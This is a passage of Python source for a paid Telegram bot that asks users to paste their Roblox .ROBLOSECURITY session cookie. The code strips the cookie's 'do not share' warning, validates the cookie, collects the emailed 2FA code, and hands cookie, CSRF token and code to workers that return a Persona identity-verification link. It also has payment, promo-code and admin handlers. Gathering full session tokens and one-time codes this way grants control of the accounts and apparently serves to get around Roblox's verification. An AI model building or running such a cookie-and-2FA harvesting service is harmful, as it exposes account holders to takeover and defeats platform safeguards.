    text = f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_sub')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
    return WAITING_MENU

async def handle_set_lang(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка выбора языка (только при первом входе или через /lang)."""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    lang = "ru" if query.data == "set_lang_ru" else "en"
    db_set_lang(user_id, lang)

    attempts, sub_status = _sub_status_text(user_id)
    text = f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_sub')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}"
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
    return WAITING_MENU

async def lang_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/lang — смена языка в любой момент."""
    await update.message.reply_text("🌐 Выберите язык / Choose language:", reply_markup=_lang_kb())
    return WAITING_LANG

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    tg = update.effective_user
    username = tg.username or tg.first_name or "Аноним"
    data = query.data

    # Отмена 2FA верификации — может прийти из WAITING_2FA_CODE через handle_callback fallback
    if data == "cancel_2fa":
        return await receive_2fa_code(update, context)

    # Смена языка через главное меню
    if data in ("set_lang_ru", "set_lang_en"):
        return await handle_set_lang(update, context)

    if data == "main_menu":
        attempts, sub_status = _sub_status_text(user_id)
        text = f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_sub')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
        return WAITING_MENU

    if data == "help":
        await query.edit_message_text(t(user_id, "help_text"), parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
        return WAITING_MENU

    if data == "top":
        rows = db_get_top(10)
        medals = ["🥇", "🥈", "🥉"]
        lines = [t(user_id, "top_title")]
        if not rows:
            lines.append(t(user_id, "top_empty"))
        else:
            for i, (uid, uname, spent) in enumerate(rows):
                medal = medals[i] if i < 3 else f"{i+1}."
                lines.append(f"{medal} {uname or '---'} — ${round(spent, 2)}")
        await query.edit_message_text("\n".join(lines), parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
        return WAITING_MENU

    if data == "promo":
        context.user_data["waiting"] = "promo"
        await query.edit_message_text(f"{t(user_id, 'promo_title')}\n\n{t(user_id, 'promo_enter')}", parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
        return WAITING_PROMO

    if data == "buy":
        await query.edit_message_text(f"{t(user_id, 'buy_title')}\n\n{t(user_id, 'buy_price')}", parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(t(user_id, "btn_buy_attempts"), callback_data="buy_attempts")],
                [InlineKeyboardButton(t(user_id, "btn_buy_sub"), callback_data="buy_sub")],
                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
            ]))
        return WAITING_BUY

    if data == "buy_attempts":
        await query.edit_message_text("🎯 Выберите пакет попыток:" if (db_get_lang(user_id) or "ru") == "ru" else "🎯 Choose attempts package:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(t(user_id, "btn_buy_1"), callback_data="buy_1")],
                [InlineKeyboardButton(t(user_id, "btn_buy_5"), callback_data="buy_5")],
                [InlineKeyboardButton(t(user_id, "btn_buy_10"), callback_data="buy_10")],
                [InlineKeyboardButton(t(user_id, "btn_buy_15"), callback_data="buy_15")],
                [InlineKeyboardButton(t(user_id, "btn_buy_25"), callback_data="buy_25")],
                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
            ]))
        return WAITING_BUY

    if data == "buy_sub":
        await query.edit_message_text("♾️ Выберите период подписки:" if (db_get_lang(user_id) or "ru") == "ru" else "♾️ Choose subscription period:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(t(user_id, "btn_sub_1d"), callback_data="sub_1")],
                [InlineKeyboardButton(t(user_id, "btn_sub_3d"), callback_data="sub_3")],
                [InlineKeyboardButton(t(user_id, "btn_sub_7d"), callback_data="sub_7")],
                [InlineKeyboardButton(t(user_id, "btn_sub_30d"), callback_data="sub_30")],
                [InlineKeyboardButton(t(user_id, "btn_sub_inf"), callback_data="sub_0")],
                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
            ]))
        return WAITING_BUY

    if data.startswith("sub_") and data[4:].isdigit():
        days = int(data[4:])
        price = SUBSCRIPTIONS.get(days)
        labels = {1: t(user_id, "btn_sub_1d"), 3: t(user_id, "btn_sub_3d"), 7: t(user_id, "btn_sub_7d"), 30: t(user_id, "btn_sub_30d"), 0: t(user_id, "btn_sub_inf")}
        desc = labels.get(days, f"{days} дней")
        invoice = create_invoice(price, 1)
        if not invoice:
            await query.answer(t(user_id, "pay_error"), show_alert=True)
            return WAITING_BUY
        inv_key = f"sub_{user_id}_{invoice['invoice_id']}"
        # БАГ-4: сохраняем user_id для проверки владельца при check_
        pending_payments[inv_key] = {"type": "sub", "user_id": user_id, "days": days, "price": price, "desc": desc}
        await query.edit_message_text(f"Счёт на подписку: {desc}\nСумма: ${price}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(t(user_id, "btn_pay"), url=invoice["pay_url"])],
                [InlineKeyboardButton(t(user_id, "btn_check_pay"), callback_data=f"check_{inv_key}")],
                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy_sub")],
            ]))
        return WAITING_PAYMENT

    if data.startswith("buy_") and data not in ("buy_attempts", "buy_sub"):
        # БАГ-5: int() без try/except упадёт при ручном callback вида buy_abc
        try:
            count = int(data.split("_")[1])
        except (ValueError, IndexError):
            return WAITING_MENU
        discount = DISCOUNTS_2FA.get(count, 0)
        total = round(count * PRICE_2FA * (1 - discount), 2)
        raw = create_invoice(total, count)
        if not raw:
            await query.answer(t(user_id, "pay_error"), show_alert=True)
            return WAITING_BUY
        inv_key = f"cb_{raw['invoice_id']}"
        pending_payments[inv_key] = {"user_id": user_id, "attempts": count, "total": total}
        await query.edit_message_text(t(user_id, "invoice_created", amount=f"{total:.2f}", attempts=count),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(t(user_id, "btn_pay"), url=raw["pay_url"])],
                [InlineKeyboardButton(t(user_id, "btn_check_pay"), callback_data=f"check_{inv_key}")],
                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
            ]))
        return WAITING_PAYMENT

    if data.startswith("check_"):
        inv_key = data[6:]
        # inv_key форматы: "cb_{invoice_id}" или "sub_{user_id}_{invoice_id}"
        # invoice_id — всегда последний сегмент
        raw_id = inv_key.split("_")[-1]

        # БАГ-4: проверяем владельца ДО обращения к платёжному API
        payment_preview = pending_payments.get(inv_key)
        if payment_preview is not None and payment_preview.get("user_id") != user_id:
            await query.answer("Это не ваш платёж.", show_alert=True)
            return WAITING_MENU

        inv = check_invoice(raw_id)
        if inv and inv.get("status") == "paid":
            payment = pending_payments.pop(inv_key, None)
            if payment is None:
                # Платёж уже обработан или бот перезапускался
                await query.answer("Платёж уже обработан или сессия устарела. Обратитесь в поддержку.", show_alert=True)
            elif payment.get("type") == "sub":
                db_set_subscription(user_id, payment["days"])
                db_upsert_user(user_id, username, spent_delta=payment["price"])
                await query.edit_message_text(t(user_id, "sub_bought", desc=payment["desc"]),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
            else:
                cnt = payment["attempts"]
                db_upsert_user(user_id, username, attempts_delta=cnt, spent_delta=payment["total"])
                await query.edit_message_text(t(user_id, "pay_ok", attempts=cnt, total=db_get_attempts(user_id)),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
        else:
            await query.answer(t(user_id, "pay_pending"), show_alert=True)
        return WAITING_MENU

    if data == "get_link":
        await query.edit_message_text(t(user_id, "ask_2fa"), reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(t(user_id, "btn_no_2fa"), callback_data="2fa_no"),
             InlineKeyboardButton(t(user_id, "btn_with_2fa"), callback_data="2fa_yes")],
            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
        ]))
        return WAITING_MENU

    if data in ["2fa_yes", "2fa_no"]:
        context.user_data["has_2fa"] = (data == "2fa_yes")
        await query.edit_message_text(t(user_id, "choose_method"), reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(t(user_id, "btn_camera"), callback_data="choose_camera")],
            [InlineKeyboardButton(t(user_id, "btn_id"), callback_data="choose_id")],
            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="get_link")],
        ]))
        return WAITING_MENU

    if data in ["choose_camera", "choose_id"]:
        context.user_data["method"] = "camera" if data == "choose_camera" else "id"
        has_2fa = context.user_data.get("has_2fa", False)
        cookie_prompt_key = "2fa_ask_cookie" if has_2fa else "no2fa_ask_cookie"
        await query.edit_message_text(t(user_id, cookie_prompt_key), parse_mode="Markdown")
        return WAITING_COOKIE

    # ── ADMIN ──
    if data == "admin":
        if user_id not in ADMIN_IDS:
            return WAITING_MENU
        rows = db_get_all_users()
        promos = db_get_all_promos()
        await query.edit_message_text(
            f"🛠 *Админ панель*\n\nПользователей: *{len(rows)}*\nПромокодов: *{len(promos)}*",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👥 Список пользователей", callback_data="admin_users")],
                [InlineKeyboardButton("🎫 Список промокодов", callback_data="admin_promo_list")],
                [InlineKeyboardButton("➕ Добавить попытки", callback_data="admin_add_bal"),
                 InlineKeyboardButton("➖ Отнять попытки", callback_data="admin_rem_bal")],
                [InlineKeyboardButton("🎟️ Выдать подписку", callback_data="admin_add_sub")],
                [InlineKeyboardButton("➕ Создать промокод", callback_data="admin_create_promo")],
                [InlineKeyboardButton("🏠 На главную", callback_data="main_menu")],
            ])
        )
        return WAITING_ADMIN

    if data == "admin_users":
        if user_id not in ADMIN_IDS:
            return WAITING_MENU
        rows = db_get_all_users()
        lines = ["*👥 Список пользователей:*\n"]
        for uid, uname, atts, spent in rows[:30]:
            lines.append(f"ID: `{uid}` | @{escape_md(uname or '---')} | Поп: {atts} | ${round(spent, 2)}")
        await query.edit_message_text("\n".join(lines), parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ В админку", callback_data="admin")]]))
        return WAITING_ADMIN

    if data == "admin_promo_list":
        if user_id not in ADMIN_IDS:
            return WAITING_MENU
        rows = db_get_all_promos()
        lines = ["*🎫 Список промокодов:*\n"]
        for code, atts, uses, max_uses in rows:
            lines.append(f"`{code}` — {atts} поп. | {uses}/{max_uses}")
        await query.edit_message_text("\n".join(lines) if rows else "Промокодов нет.", parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ В админку", callback_data="admin")]]))
        return WAITING_ADMIN

    if data == "admin_add_bal":
        if user_id not in ADMIN_IDS:
            return WAITING_MENU
        context.user_data["waiting"] = "admin_add_bal_id"
        await query.edit_message_text("➕ *Добавить попытки*\n\nВведите Telegram ID:", parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
        return WAITING_ADMIN_ADD_BALANCE

    if data == "admin_rem_bal":
        if user_id not in ADMIN_IDS:
            return WAITING_MENU
        context.user_data["waiting"] = "admin_rem_bal_id"
        await query.edit_message_text("➖ *Отнять попытки*\n\nВведите Telegram ID:", parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
        return WAITING_ADMIN_REMOVE_BALANCE

    if data == "admin_add_sub":
        if user_id not in ADMIN_IDS:
            return WAITING_MENU
        context.user_data["waiting"] = "admin_add_sub_id"
        await query.edit_message_text("🎟️ *Выдать подписку*\n\nВведите Telegram ID:", parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
        return WAITING_ADMIN_ADD_SUB

    if data == "admin_create_promo":
        if user_id not in ADMIN_IDS:
            return WAITING_MENU
        context.user_data["waiting"] = "admin_create_promo_text"
        await query.edit_message_text("🎟️ *Создание промокода*\n\nФормат: `КОД ПОПЫТКИ ЛИМИТ`\nПример: `VIP 10 5`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
        return WAITING_ADMIN_CREATE_PROMO

    return WAITING_MENU

async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    tg = update.effective_user
    username = tg.username or tg.first_name or "Аноним"
    waiting = context.user_data.get("waiting")

    if waiting == "promo":
        context.user_data["waiting"] = None
        ok, msg_key, atts = db_use_promo(user_id, text.upper(), username)
        if ok:
            await update.message.reply_text(t(user_id, "promo_ok", attempts=atts, total=db_get_attempts(user_id)),
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
        else:
            key_map = {"not_found": "promo_not_found", "used": "promo_used", "used_by_you": "promo_used_by_you"}
            await update.message.reply_text(t(user_id, key_map.get(msg_key, "promo_not_found")),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
        return WAITING_MENU

    if user_id in ADMIN_IDS:
        if waiting == "admin_add_bal_id":
            try:
                context.user_data["target_uid"] = int(text)
                context.user_data["waiting"] = "admin_add_bal_amt"
                await update.message.reply_text("Введите количество попыток:")
                return WAITING_ADMIN_ADD_BALANCE_AMOUNT
            except ValueError:
                await update.message.reply_text("Ошибка! Числовой ID.")
                return WAITING_ADMIN_ADD_BALANCE

        elif waiting == "admin_add_bal_amt":
            context.user_data["waiting"] = None
            target_uid = context.user_data.get("target_uid")
            try:
                amt = int(text)
                db_upsert_user(target_uid, "AdminAdded", attempts_delta=amt)
                await update.message.reply_text(f"✅ +{amt} попыток → `{escape_md(str(target_uid))}`", parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
            except ValueError:
                await update.message.reply_text("Ошибка! Введите число.")
            return WAITING_ADMIN

        elif waiting == "admin_rem_bal_id":
            try:
                context.user_data["target_uid"] = int(text)
                context.user_data["waiting"] = "admin_rem_bal_amt"
                await update.message.reply_text("Введите количество попыток для списания:")
                return WAITING_ADMIN_REMOVE_BALANCE_AMOUNT
            except ValueError:
                await update.message.reply_text("Ошибка! Числовой ID.")
                return WAITING_ADMIN_REMOVE_BALANCE

        elif waiting == "admin_rem_bal_amt":
            context.user_data["waiting"] = None
            target_uid = context.user_data.get("target_uid")
            try:
                amt = int(text)
                cur = db_get_attempts(target_uid)
                to_rem = min(amt, cur)
                db_upsert_user(target_uid, "AdminRem", attempts_delta=-to_rem)
                await update.message.reply_text(f"✅ Списано {to_rem} попыток у `{escape_md(str(target_uid))}`", parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
            except ValueError:
                await update.message.reply_text("Ошибка! Введите число.")
            return WAITING_ADMIN

        elif waiting == "admin_add_sub_id":
            try:
                context.user_data["target_uid"] = int(text)
                context.user_data["waiting"] = "admin_add_sub_days"
                await update.message.reply_text("Введите дней подписки (0 = навсегда):")
                return WAITING_ADMIN_ADD_SUB
            except ValueError:
                await update.message.reply_text("Ошибка! Числовой ID.")
                return WAITING_ADMIN_ADD_SUB

        elif waiting == "admin_add_sub_days":
            context.user_data["waiting"] = None
            target_uid = context.user_data.get("target_uid")
            try:
                days = int(text)
                db_set_subscription(target_uid, days)
                label = "навсегда" if days == 0 else f"{days} дней"
                await update.message.reply_text(f"✅ Подписка ({label}) → `{escape_md(str(target_uid))}`", parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
            except ValueError:
                await update.message.reply_text("Ошибка!")
            return WAITING_ADMIN

        elif waiting == "admin_create_promo_text":
            context.user_data["waiting"] = None
            parts = text.split()
            if len(parts) >= 3:
                # БАГ-6: int() без try/except падал при нечисловых значениях
                try:
                    db_create_promo(parts[0].upper(), int(parts[1]), int(parts[2]))
                    await update.message.reply_text(f"✅ Промокод `{escape_md(parts[0].upper())}` создан!", parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
                except ValueError:
                    await update.message.reply_text("Ошибка! Попытки и лимит должны быть числами. Формат: КОД ПОПЫТКИ ЛИМИТ")
            else:
                await update.message.reply_text("Неверный формат! КОД ПОПЫТКИ ЛИМИТ")
            return WAITING_ADMIN

    return await receive_cookie(update, context)

def _normalize_cookie(raw: str) -> str:
    """Очищает cookie от лишнего:
    - Убирает WARNING_BLABLABLA| префикс который Roblox добавляет в cookie
    - Убирает пробелы/переносы строк
    - Убирает кавычки если пользователь скопировал с ними
    """
    c = raw.strip().strip('"').strip("'").strip()
    # Roblox добавляет предупреждение вида: _|WARNING:-DO-NOT-SHARE...|_<actual_token>
    # Некоторые пользователи копируют весь cookie целиком включая WARNING
    # group(0) = весь матч (_|WARNING...|_<token>) — Roblox принимает cookie с WARNING-префиксом
    warning_match = re.search(r'(_\|WARNING[^|]*\|_)(.*)', c, re.DOTALL)
    if warning_match:
        full_token = warning_match.group(0).strip()
        # Проверяем что после WARNING есть хоть что-то (group(2) — часть после |_)
        actual_part = warning_match.group(2).strip()
        if actual_part:
            c = full_token
        # Если actual_part пуст — оставляем c как есть (невалидный cookie, поймает /authenticated)
    return c

async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cookie = _normalize_cookie(update.message.text)
    method = context.user_data.get("method")
    has_2fa = context.user_data.get("has_2fa", False)
    user_id = update.effective_user.id
    tg = update.effective_user
    username = tg.username or tg.first_name or "Аноним"

    if not method:
        await update.message.reply_text("Сначала выберите метод через /start")
        return WAITING_MENU

    chat_id = update.effective_chat.id

    try:
        await update.message.delete()
    except Exception:
        pass

    msg = await context.bot.send_message(chat_id=chat_id, text=t(user_id, "checking_cookie"))

    # БАГ-3: не вызываем blocking requests напрямую в async — оборачиваем в executor
    def _validate_cookie(c: str):
        s = requests.Session()
        s.cookies[".ROBLOSECURITY"] = c
        return s.get("https://users.roblox.com/v1/users/authenticated", timeout=10)

    loop = asyncio.get_running_loop()
    r = await loop.run_in_executor(executor, _validate_cookie, cookie)
    if r.status_code != 200:
        await msg.edit_text(t(user_id, "invalid_cookie"))
        return WAITING_MENU

    user = r.json()
    method_name = t(user_id, "method_camera") if method == "camera" else t(user_id, "method_id")

    # БАГ-A: используем флаг attempt_was_deducted вместо повторного запроса к БД при возврате.
    # Повторный db_get_subscription() может вернуть False если подписка истекла за 300 сек
    # работы воркера → пользователь получил бы бесплатную попытку.
    attempt_was_deducted = False

    if has_2fa:
        is_sub_active, _, _ = db_get_subscription(user_id)
        if not is_sub_active:
            # БАГ-1: атомарное списание попытки — один UPDATE вместо SELECT + UPDATE
            # БАГ-B: try/except чтобы при сбое БД сообщение не зависло навсегда
            try:
                spent_ok = db_deduct_attempt(user_id, username)
            except Exception as e:
                logging.error("db_deduct_attempt error: %s", e)
                await msg.edit_text("❌ Ошибка сервера, попробуйте позже." if (db_get_lang(user_id) or "ru") == "ru" else "❌ Server error, please try later.")
                return WAITING_MENU
            if not spent_ok:
                await msg.edit_text("❌ Нет попыток 2FA!" if (db_get_lang(user_id) or "ru") == "ru" else "❌ No 2FA attempts!")
                return WAITING_MENU
            attempt_was_deducted = True

    await msg.edit_text(t(user_id, "processing", name=user["name"], method=method_name, attempts=db_get_attempts(user_id)), parse_mode="Markdown")

    _start_time = _time.time()

    if has_2fa:
        result = await loop.run_in_executor(executor, call_worker_2fa, cookie, method)
    else:
        result = await loop.run_in_executor(executor, get_url_via_api, cookie, method)

    elapsed = round(_time.time() - _start_time)

    logging.info("receive_cookie result: has_2fa=%s, result=%s", has_2fa, str(result)[:120] if result else None)

    # БАГ-11: проверяем домен точнее — не просто подстроку, а netloc
    def _is_valid_persona_link(url: str) -> bool:
        try:
            from urllib.parse import urlparse
            p = urlparse(url)
            return (
                p.scheme == "https"
                and (p.netloc == "withpersona.com" or p.netloc.endswith(".withpersona.com"))
                and "inquiry-id" in p.query
            )
        except Exception:
            return False

    # Проверяем не пришёл ли от воркера challenge вместо ссылки
    # (воркер может вернуть dict с challenge данными если email код уже отправлен)
    if isinstance(result, dict) and result.get("challengeId") and result.get("csrf"):
        # Воркер получил challenge — код отправлен на email, ждём от пользователя
        lang = db_get_lang(user_id) or "ru"
        # Очищаем устаревшие сессии перед добавлением новой
        _cleanup_pending_2fa()
        pending_2fa[user_id] = {
            "cookie": cookie,
            "csrf": result["csrf"],
            "challenge_id": result["challengeId"],
            "user_roblox_id": user.get("id"),
            "method": method,
            "attempt_was_deducted": attempt_was_deducted,
            "chat_id": chat_id,
            "username": username,
            "created_at": _time.time(),
        }
        code_prompt = (
            "📧 *Код отправлен на email*\n\nВведите 6-значный код из письма Roblox:"
            if lang == "ru" else
            "📧 *Code sent to email*\n\nEnter the 6-digit code from Roblox email:"
        )
        cancel_label = t(user_id, "btn_cancel")
        await msg.edit_text(code_prompt, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(cancel_label, callback_data="cancel_2fa")
            ]]))
        return WAITING_2FA_CODE

    link_ok = result and isinstance(result, str) and _is_valid_persona_link(result)
    if link_ok:
        lang = db_get_lang(user_id) or "ru"
        btn_continue_label = "▶️ Продолжить верификацию" if lang == "ru" else "▶️ Continue Verification"
        btn_back_label = t(user_id, "btn_back")
        link_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(btn_continue_label, url=result)],
            [InlineKeyboardButton(btn_back_label, callback_data="main_menu")],
        ])
        await msg.edit_text(t(user_id, "link_received"), parse_mode="Markdown", reply_markup=link_kb)
        await send_log(context, user_id, username, method, elapsed, has_2fa=has_2fa)
        attempts, sub_status = _sub_status_text(user_id)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}",
            parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
        return WAITING_MENU

    # БАГ-A: возвращаем попытку только если она реально была списана (флаг),
    # а не по повторному запросу к БД — подписка могла истечь пока воркер работал
    if attempt_was_deducted:
        db_upsert_user(user_id, username, attempts_delta=1, spent_delta=-PRICE_2FA)

    await msg.edit_text(t(user_id, "failed_returned"))
    attempts, sub_status = _sub_status_text(user_id)
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}",
        parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
    return WAITING_MENU

async def receive_2fa_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получает 6-значный код 2FA от пользователя и верифицирует его через Roblox API."""
    user_id = update.effective_user.id
    tg = update.effective_user
    username = tg.username or tg.first_name or "Аноним"
    lang = db_get_lang(user_id) or "ru"

    # Обработка нажатия кнопки "Отмена"
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        if query.data == "cancel_2fa":
            ctx = pending_2fa.pop(user_id, None)
            attempt_returned = False
            if ctx and ctx.get("attempt_was_deducted"):
                db_upsert_user(user_id, username, attempts_delta=1, spent_delta=-PRICE_2FA)
                attempt_returned = True
            if attempt_returned:
                cancel_msg = "❌ Верификация отменена. Попытка возвращена." if lang == "ru" else "❌ Verification cancelled. Attempt returned."
            else:
                cancel_msg = "❌ Верификация отменена." if lang == "ru" else "❌ Verification cancelled."
            await query.edit_message_text(cancel_msg, reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")
            ]]))
            return WAITING_MENU
        return WAITING_2FA_CODE

    code_text = update.message.text.strip()
    ctx = pending_2fa.get(user_id)

    if not ctx:
        await update.message.reply_text(
            "⚠️ Сессия истекла, начните заново /start" if lang == "ru" else "⚠️ Session expired, restart /start"
        )
        return WAITING_MENU

    # Базовая валидация — только цифры 6 символов
    if not re.match(r'^\d{6}$', code_text):
        prompt = "❌ Код должен содержать 6 цифр. Попробуйте ещё раз:" if lang == "ru" else "❌ Code must be 6 digits. Try again:"
        await update.message.reply_text(prompt, reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton(t(user_id, "btn_cancel"), callback_data="cancel_2fa")
        ]]))
        return WAITING_2FA_CODE

    chat_id = update.effective_chat.id
    thinking_msg = await update.message.reply_text(
        "⏳ Проверяю код..." if lang == "ru" else "⏳ Verifying code..."
    )

    try:
        await update.message.delete()
    except Exception:
        pass

    loop = asyncio.get_running_loop()
    success, link_or_error = await loop.run_in_executor(
        executor,
        verify_2fa_code,
        ctx["cookie"],
        ctx["user_roblox_id"],
        ctx["csrf"],
        ctx["challenge_id"],
        code_text,
    )

    if success and link_or_error and link_or_error.startswith("http"):
        pending_2fa.pop(user_id, None)
        btn_continue_label = "▶️ Продолжить верификацию" if lang == "ru" else "▶️ Continue Verification"
        link_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(btn_continue_label, url=link_or_error)],
            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
        ])
        await thinking_msg.edit_text(t(user_id, "link_received"), parse_mode="Markdown", reply_markup=link_kb)
        await send_log(context, user_id, username, ctx["method"], 0, has_2fa=True)
        attempts, sub_status = _sub_status_text(user_id)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}",
            parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
        return WAITING_MENU

    # Неверный код — пользователь может попробовать ещё раз (попытка не возвращается)
    if link_or_error in ("invalid_code", "rate_limited"):
        if link_or_error == "rate_limited":
            err_text = "⏳ Слишком много попыток. Подождите и попробуйте снова." if lang == "ru" else "⏳ Too many attempts. Wait and try again."
        else:
            err_text = "❌ Неверный код. Попробуйте ещё раз:" if lang == "ru" else "❌ Invalid code. Try again:"
        await thinking_msg.edit_text(err_text, reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton(t(user_id, "btn_cancel"), callback_data="cancel_2fa")
        ]]))
        return WAITING_2FA_CODE

    # Серверная ошибка (link_failed / exception) — возвращаем попытку и завершаем
    ctx_final = pending_2fa.pop(user_id, None)
    if ctx_final and ctx_final.get("attempt_was_deducted"):
        try:
            db_upsert_user(user_id, username, attempts_delta=1, spent_delta=-PRICE_2FA)
        except Exception as e:
            logging.error("receive_2fa_code: не удалось вернуть попытку: %s", e)

    err_text = "❌ Ошибка верификации, попытка возвращена." if lang == "ru" else "❌ Verification error, attempt returned."
    await thinking_msg.edit_text(err_text, reply_markup=InlineKeyboardMarkup([[
        InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")
    ]]))
    return WAITING_MENU

# ─────────────────────────── MAIN ───────────────────────────

def main():
    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN environment variable is not set!")
    db_init()
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CommandHandler("lang", lang_command),
        ],
        states={
            WAITING_LANG: [CallbackQueryHandler(handle_callback)],
            WAITING_MENU: [CallbackQueryHandler(handle_callback)],
            WAITING_COOKIE: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_BUY: [CallbackQueryHandler(handle_callback)],
            WAITING_PAYMENT: [CallbackQueryHandler(handle_callback)],
            WAITING_PROMO: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_ADMIN: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_ADMIN_ADD_BALANCE: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_ADMIN_ADD_BALANCE_AMOUNT: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_ADMIN_REMOVE_BALANCE: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_ADMIN_REMOVE_BALANCE_AMOUNT: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_ADMIN_ADD_SUB: [
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_ADMIN_CREATE_PROMO: [
